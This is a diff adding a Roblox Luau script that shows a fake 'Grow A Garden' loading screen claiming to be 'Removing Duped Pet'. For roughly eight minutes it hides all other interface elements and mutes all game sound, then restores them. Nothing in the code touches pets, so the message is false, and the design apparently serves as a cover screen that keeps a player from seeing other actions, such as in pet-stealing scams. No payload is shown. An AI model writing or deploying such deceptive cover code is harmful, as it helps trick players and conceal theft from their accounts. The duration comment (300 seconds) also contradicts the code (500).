@@ -1,0 +1,107 @@
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local SoundService = game:GetService("SoundService")
+local player = Players.LocalPlayer
+
+-- Disable all default UI (including topbar)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+-- Hide all existing GUIs (including external script ones)
+for _, gui in ipairs(player:WaitForChild("PlayerGui"):GetChildren()) do
+	if gui:IsA("GuiBase") and gui.Name ~= "LoadingScreen" then
+		gui.Enabled = false
+	end
+end
+
+-- Mute all sounds in game
+for _, obj in ipairs(game:GetDescendants()) do
+	if obj:IsA("Sound") then
+		obj:Stop()
+		obj.Volume = 0
+	end
+end
+
+-- Create loading GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "LoadingScreen"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- Background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(212, 255, 212)
+bg.Parent = gui
+
+-- Title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.AnchorPoint = Vector2.new(0.5, 0.5)
+title.Position = UDim2.new(0.5, 0, 0.35, 0)
+title.BackgroundTransparency = 1
+title.Text = "🌸 Grow A Garden ⛩️"
+title.TextColor3 = Color3.fromRGB(0, 128, 0)
+title.Font = Enum.Font.FredokaOne
+title.TextScaled = true
+title.Parent = bg
+
+-- Status
+local status = Instance.new("TextLabel")
+status.Size = UDim2.new(1, 0, 0.05, 0)
+status.AnchorPoint = Vector2.new(0.5, 0.5)
+status.Position = UDim2.new(0.5, 0, 0.44, 0)
+status.BackgroundTransparency = 1
+status.Text = "Removing Duped Pet... Please Wait."
+status.TextColor3 = Color3.fromRGB(33, 33, 33)
+status.Font = Enum.Font.FredokaOne
+status.TextScaled = true
+status.Parent = bg
+
+-- Progress bar background
+local barBackground = Instance.new("Frame")
+barBackground.Size = UDim2.new(0.6, 0, 0.05, 0)
+barBackground.AnchorPoint = Vector2.new(0.5, 0.5)
+barBackground.Position = UDim2.new(0.5, 0, 0.55, 0)
+barBackground.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
+barBackground.BorderSizePixel = 0
+barBackground.Parent = bg
+
+-- Progress fill
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 180, 0)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = barBackground
+
+-- Percent text
+local percent = Instance.new("TextLabel")
+percent.Size = UDim2.new(1, 0, 1, 0)
+percent.BackgroundTransparency = 1
+percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+percent.TextStrokeTransparency = 0.5
+percent.Font = Enum.Font.FredokaOne
+percent.TextScaled = true
+percent.Text = "0%"
+percent.Parent = progressBar
+
+-- Animate bar (5 mins = 300 seconds)
+local duration = 500
+local steps = 100
+for i = 1, steps do
+	local progress = i / steps
+	progressBar.Size = UDim2.new(progress, 0, 1, 0)
+	percent.Text = math.floor(progress * 100) .. "%"
+	wait(duration / steps)
+end
+
+-- Restore all after loading
+gui:Destroy()
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
+-- Re-enable original GUIs
+for _, gui in ipairs(player:WaitForChild("PlayerGui"):GetChildren()) do
+	if gui:IsA("GuiBase") then
+		gui.Enabled = true
+	end
+end
